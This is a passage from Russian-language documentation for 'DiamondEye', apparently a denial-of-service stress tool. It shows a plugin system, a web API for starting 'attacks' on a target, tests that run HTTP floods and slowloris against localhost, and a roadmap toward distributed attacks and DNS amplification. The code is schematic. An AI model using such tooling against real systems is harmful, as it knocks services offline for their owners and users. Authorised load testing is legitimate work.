        pass
    
    async def cleanup(self):
        """Очистка ресурсов плагина"""
        pass

# Регистрация плагинов
PLUGIN_REGISTRY = {}

def register_plugin(name):
    """Декоратор для регистрации плагинов"""
    def decorator(cls):
        PLUGIN_REGISTRY[name] = cls
        return cls
    return decorator

@register_plugin('cors_scanner')
class CORSPlugin(Plugin):
    """Плагин для сканирования CORS уязвимостей"""
    
    async def execute(self):
        targets = self._generate_cors_targets()
        for target in targets:
            request = self._build_cors_request(target)
            response = await self.attack.client.send(request)
            if self._is_vulnerable(response):
                self._report_vulnerability(target)

# Загрузка плагинов
def load_plugins(attack, plugin_names):
    """Загрузка указанных плагинов"""
    plugins = []
    for name in plugin_names:
        if name in PLUGIN_REGISTRY:
            plugin_class = PLUGIN_REGISTRY[name]
            plugin = plugin_class(attack)
            plugins.append(plugin)
    
    return plugins
```

### 10.2. Web API

```python
# api/server.py
from fastapi import FastAPI, BackgroundTasks
from pydantic import BaseModel

app = FastAPI(title="DiamondEye API")

class AttackRequest(BaseModel):
    target: str
    workers: int = 10
    duration: int = 60
    strategy: str = "http_flood"

@app.post("/attack/start")
async def start_attack(request: AttackRequest, background_tasks: BackgroundTasks):
    """Запуск атаки через API"""
    attack_id = generate_attack_id()
    
    # Запуск в фоне
    background_tasks.add_task(
        run_attack,
        attack_id=attack_id,
        config=request.dict()
    )
    
    return {"attack_id": attack_id, "status": "started"}

@app.get("/attack/{attack_id}/status")
async def get_attack_status(attack_id: str):
    """Получение статуса атаки"""
    status = get_attack_status_from_db(attack_id)
    return status

@app.post("/attack/{attack_id}/stop")
async def stop_attack(attack_id: str):
    """Остановка атаки"""
    stop_attack_by_id(attack_id)
    return {"status": "stopped"}
```

---

## 11. ROADMAP И РАЗВИТИЕ

### 11.1. Краткосрочные цели (v9.9)

1. **Улучшение HTTP/3 поддержки**
   - Нативная интеграция с aioquic
   - Оптимизация QUIC handshake
   - Поддержка 0-RTT

2. **Расширенное сканирование**
   - Автоматическое обнаружение API
   - Фаззинг параметров
   - Обнаружение WAF

3. **Улучшенная аналитика**
   - Машинное обучение для оптимизации RPS
   - Предсказание отказов
   - Автоматическая калибровка

### 11.2. Среднесрочные цели (v10.0)

1. **Распределенная архитектура**
   - Master-Worker модель
   - Координация через Redis
   - Геораспределение атак

2. **Поддержка протоколов**
   - DNS amplification
   - LDAP injection
   - SMTP flood

3. **Графический интерфейс**
   - Web-based dashboard
   - Real-time визуализация
   - Управление через браузер

### 11.3. Долгосрочное видение

1. **Платформа тестирования безопасности**
   - Интеграция с OWASP ZAP
   - Автоматические отчеты
   - CI/CD интеграция

2. **Образовательный модуль**
   - Интерактивные уроки
   - CTF задачи
   - Сертификация

---

## 12. ТЕСТИРОВАНИЕ И QA

### 12.1. Unit-тесты

```python
# tests/test_attack.py
import pytest
from attack import DiamondEyeAttack

class TestDiamondEyeAttack:
    @pytest.fixture
    def attack_config(self):
        return {
            'url': 'http://localhost:8080',
            'workers': 2,
            'sockets': 10
        }
    
    @pytest.mark.asyncio
    async def test_attack_initialization(self, attack_config):
        """Тест инициализации атаки"""
        attack = DiamondEyeAttack(**attack_config)
        assert attack.url == attack_config['url']
        assert attack.workers == attack_config['workers']
    
    @pytest.mark.asyncio 
    async def test_worker_creation(self, attack_config):
        """Тест создания воркеров"""
        attack = DiamondEyeAttack(**attack_config)
        await attack._create_workers()
        assert len(attack.workers) == attack_config['workers']
```

### 12.2. Интеграционные тесты

```python
# tests/integration/test_http_flood.py
class TestHTTPFlood:
    @pytest.mark.integration
    @pytest.mark.slow
    async def test_http_flood_localhost(self):
        """Интеграционный тест HTTP флуда"""
        # Запуск тестового сервера
        test_server = await start_test_server()
        
        # Запуск атаки
        attack = DiamondEyeAttack(
            url=test_server.url,
            workers=5,
            sockets=20,
            flood=True
        )
        
        # Выполнение на короткое время
        attack_task = asyncio.create_task(attack.start())
        await asyncio.sleep(5.0)
        await attack.shutdown()
        
        # Проверка результатов
        assert attack.sent > 0
        assert attack.failed < attack.sent * 0.1  # <10% ошибок
```

### 12.3. Нагрузочное тестирование

```python
# benchmarks/benchmark.py
class Benchmark:
    """Бенчмарк производительности"""
    
    @staticmethod
    async def benchmark_scenarios():
        """Тестирование различных сценариев"""
        scenarios = [
            ('http_flood', {'flood': True, 'workers': 100}),
            ('slowloris', {'slow': 0.3, 'workers': 50}),
            ('http2_multiplex', {'http2': True, 'workers': 10})
        ]
        
        results = {}
        for name, config in scenarios:
            result = await Benchmark._run_scenario(config)
            results[name] = result
        
        return results
```

---

## 13. СПРАВОЧНЫЕ МАТЕРИАЛЫ

### 13.1. Ключевые термины

| Термин | Описание |
|--------|----------|
| **RPS** | Requests Per Second (Запросов в секунду) |
| **Worker** | Отдельный процесс/поток отправки запросов |
| **Socket** | Сетевое соединение внутри воркера |
| **Keep-alive** | Переиспользование TCP соединений |
| **Slowloris** | Атака медленными запросами |
| **HTTP/2 Rapid Reset** | Эксплуатация уязвимости в HTTP/2 |

### 13.2. Рекомендуемая литература

1. **HTTP/1.1 RFC 7230-7237** — базовый протокол
2. **HTTP/2 RFC 7540** — мультиплексирование
3. **HTTP/3 RFC 9114** — QUIC транспорт
4. **OWASP Testing Guide** — тестирование безопасности
5. **High Performance Browser Networking** — оптимизация сети

### 13.3. Полезные инструменты

1. **Wireshark** — анализ сетевого трафика
2. **tcpdump** — захват пакетов в Linux
3. **httpx** — HTTP клиент для Python
4. **locust** — альтернативный нагрузочный тестер
5. **vegeta** — нагрузочное тестирование на Go

### 13.4. Контакты и поддержка
- GitHub Issues: https://github.com/UndefinedClear/DiamondEye
- Telegram Chat: @pelikan6
- Email: larion626@gmail.com

---

## 📄 ЛИЦЕНЗИЯ И ЮРИДИЧЕСКАЯ ИНФОРМАЦИЯ

**Лицензия:** MIT License  
**Авторские права:** © 2025 DiamondEye Project  
**Ответственное использование:** Только для тестирования систем с явного разрешения

**Отказ от ответственности:**
Разработчики не несут ответственности за:
- Несанкционированное использование инструмента
- Нарушение законов вашей страны
- Ущерб, причиненный третьим лицам
- Последствия неправильного использования

**Этический кодекс:**
1. Всегда получайте письменное разрешение
2. Ограничивайте тесты контролируемыми средами
3. Сообщайте об обнаруженных уязвимостях ответственно
4. Используйте знания для защиты, а не атаки
